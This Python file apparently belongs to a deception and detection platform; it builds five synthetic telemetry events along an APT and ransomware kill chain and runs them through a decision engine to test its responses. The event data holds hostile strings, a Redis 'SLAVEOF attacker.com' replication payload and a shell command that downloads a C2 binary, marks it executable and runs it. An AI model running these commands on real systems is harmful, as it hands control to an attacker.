"""Aggressive APT / Ransomware Kill-Chain Simulation Scenario.

Emulates a high-velocity, multi-stage cyber adversary progressing rapidly
through the MITRE ATT&CK matrix:
1. Reconnaissance / Honeypot Probe (T1046)
2. Decoy Credential Theft (T1552.001)
3. C2 Beacon & Process Anomaly (T1059.004)
4. Container Escape Attempt (T1611)
5. Ransomware Impact / File Tampering (T1486)
"""

from datetime import datetime, timezone
from typing import List, Tuple
from uuid import uuid4

from core.engine import MirrorEngine
from core.models import MirrorEvent, PolicyDecision


class AggressiveAPTScenario:
    """Orchestrates an aggressive multi-phase APT attack simulation against Dimensión Espejo."""

    def __init__(self, engine: MirrorEngine) -> None:
        self.engine = engine

    def build_kill_chain_events(self) -> List[Tuple[str, MirrorEvent]]:
        """Construct the 5 chronological attack events simulating the kill-chain."""
        now = datetime.now(timezone.utc)
        
        events = [
            (
                "Phase 1: Reconnaissance & Honeypot Scanning (MITRE T1046)",
                MirrorEvent(
                    id=uuid4(),
                    timestamp=now,
                    source="opencanary",
                    sensor="fake_port",
                    event_type="fake_port_probe",
                    attack_stage="discovery",
                    asset_id="redis",
                    severity="high",
                    confidence=0.89,
                    source_ip="198.51.100.44",
                    evidence={
                        "target_port": 16379,
                        "protocol": "tcp",
                        "payload": "PING\\r\\nINFO\\r\\nSLAVEOF attacker.com 6379\\r\\n",
                        "mitre_id": "T1046",
                    },
                ),
            ),
            (
                "Phase 2: Decoy Credential Harvesting (MITRE T1552.001)",
                MirrorEvent(
                    id=uuid4(),
                    timestamp=now,
                    source="canary",
                    sensor="decoy_file",
                    event_type="canary_trigger",
                    attack_stage="credential_access",
                    asset_id="secrets",
                    severity="critical",
                    confidence=0.99,
                    path=".env.backup",
                    evidence={
                        "action": "open_read",
                        "caller_process": "cat",
                        "caller_pid": 48211,
                        "canary_token": "canary_jwt_aws_dev_sec_9918",
                        "mitre_id": "T1552.001",
                    },
                ),
            ),
            (
                "Phase 3: C2 Beacon & Process Anomaly (MITRE T1059.004)",
                MirrorEvent(
                    id=uuid4(),
                    timestamp=now,
                    source="osquery",
                    sensor="process_monitor",
                    event_type="process_anomaly",
                    attack_stage="execution",
                    asset_id="api",
                    container_id="developer-api",
                    severity="high",
                    confidence=0.88,
                    process="sh",
                    command="/bin/sh -c 'curl -fsSL https://c2.apt-syndicate.io/payload.elf -o /tmp/kdev && chmod +x /tmp/kdev && /tmp/kdev'",
                    evidence={
                        "parent_pid": 1102,
                        "mitre_id": "T1059.004",
                        "c2_domain": "c2.apt-syndicate.io",
                    },
                ),
            ),
            (
                "Phase 4: Container Breakout / Escape (MITRE T1611)",
                MirrorEvent(
                    id=uuid4(),
                    timestamp=now,
                    source="docker",
                    sensor="docker_events",
                    event_type="container_escape",
                    attack_stage="privilege_escalation",
                    asset_id="api",
                    container_id="developer-api",
                    severity="critical",
                    confidence=0.97,
                    evidence={
                        "syscall": "sys_ptrace",
                        "cgroup_breakout": True,
                        "privilege": "cap_sys_admin",
                        "target_host_pid": 1,
                        "mitre_id": "T1611",
                    },
                ),
            ),
            (
                "Phase 5: Ransomware / Data Destruction Burst (MITRE T1486)",
                MirrorEvent(
                    id=uuid4(),
                    timestamp=now,
                    source="fim",
                    sensor="filesystem_tampering",
                    event_type="filesystem_tampering",
                    attack_stage="impact",
                    asset_id="postgres",
                    container_id="developer-postgres",
                    severity="critical",
                    confidence=0.95,
                    evidence={
                        "tampered_dir": "/var/lib/postgresql/data",
                        "modified_count": 512,
                        "file_extension": ".locked",
                        "ransom_note": "/var/lib/postgresql/README_DECRYPT.txt",
                        "mitre_id": "T1486",
                    },
                ),
            ),
        ]
        return events

    async def execute(self) -> List[Tuple[str, MirrorEvent, PolicyDecision]]:
        """Run all phases through the MirrorEngine and collect responses."""
        results = []
        phases = self.build_kill_chain_events()

        for description, event in phases:
            decision = self.engine.decision_engine.decide(event)
            await self.engine.ingest_event(event)
            results.append((description, event, decision))

        return results
